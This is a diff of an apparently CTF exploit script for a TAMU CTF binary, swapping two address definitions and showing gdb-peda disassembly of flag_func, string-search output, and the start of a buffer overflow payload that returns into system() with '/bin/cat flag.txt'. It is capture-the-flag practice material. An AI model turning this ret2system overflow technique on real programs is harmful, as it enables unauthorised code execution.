@@ -7,6 +7,7 @@ r.connect(('web.ctf.tamu.edu', 4324))
 
 def p(data):
 	return pack("<I",data)
+
 '''
 gdb-peda$ disassemble flag_func
 Dump of assembler code for function flag_func:
@@ -21,7 +22,7 @@ Dump of assembler code for function flag_func:
    0x080484e2 <+23>:	leave  
    0x080484e3 <+24>:	ret 
 '''
-flag = 0x0804a028 # from .data "/bin/cat flag.txt"
+system = 0x80484d9 # from flag_func()
 
 '''
 gdb-peda$ find "/bin/cat"
@@ -31,7 +32,7 @@ pwn4 : 0x80485e0 ("/bin/cat flag2.txt")
 pwn4 : 0x80495e0 ("/bin/cat flag2.txt")
 pwn4 : 0x804a028 ("/bin/cat flag.txt")
 '''
-system = 0x80484d9 # from flag_func()
+flag = 0x0804a028 # from .data "/bin/cat flag.txt"
 
 payload = "A"*16
 payload += p(system)
